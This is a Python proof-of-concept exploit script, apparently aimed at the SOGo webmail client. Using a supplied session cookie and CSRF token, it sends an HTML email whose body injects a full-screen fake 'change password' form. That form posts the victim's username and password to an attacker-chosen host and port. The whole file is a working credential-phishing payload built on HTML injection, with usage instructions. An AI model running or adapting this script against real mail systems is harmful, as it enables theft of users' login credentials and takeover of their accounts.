import requests
import sys

def main():
    if len(sys.argv) != 5:
        print("Usage: python3 script.py 'source_name:source_email' 'target_name:target_email' RHOST RPORT")
        print("Example: python3 script.py 'Vasiliy Pupkin:vpupkin@example.com' 'Peter Ivanov:pivanov@example.com' 127.0.0.1 4444")
        sys.exit(1)

    source_name, source_email = sys.argv[1].split(":")
    target_name, target_email = sys.argv[2].split(":")
    source = f"{source_name} <{source_email}>"
    target = f"{target_name} <{target_email}>"
    rhost = sys.argv[3]
    rport = sys.argv[4]

    url = "" #Change it with the endpoint where client send POST request to send messages
    text_body = f"<div style=\"position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index:1000; background-color:white; padding:1em;\">Time to change password:<br><form name=\"login\" action=\"http://{rhost}:{rport}/login.htm\"> <table><tr><td>Username:</td><td><input type=\"text\" name=\"username\"/></td></tr><tr><td>Password:</td> <td><input type=\"text\" name=\"password\"/></td></tr><tr> <td colspan=2 align=center><input type=\"submit\" value=\"Change\"/></td></tr> </table></form>"

    data = {
        "to": [target],
        "cc": [],
        "bcc": [],
        "isHTML": 1,
        "text": text_body,
        "locale": "ru",
        "subject": "test",
        "from": source,
    }

    headers = {
    "Cookie": "0xHIGHFLYxSOGo=", #Change it with your 0xHIGHFLYxSOGo cookie
    "X-Xsrf-Token": "", #Change it with your CSRF-token
    }

    response = requests.post(url, json=data, headers=headers)

    if response.status_code == 200:
        print("The request was sent successfully")
    else:
        print(f"Error while sending the request. Error code: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    main()
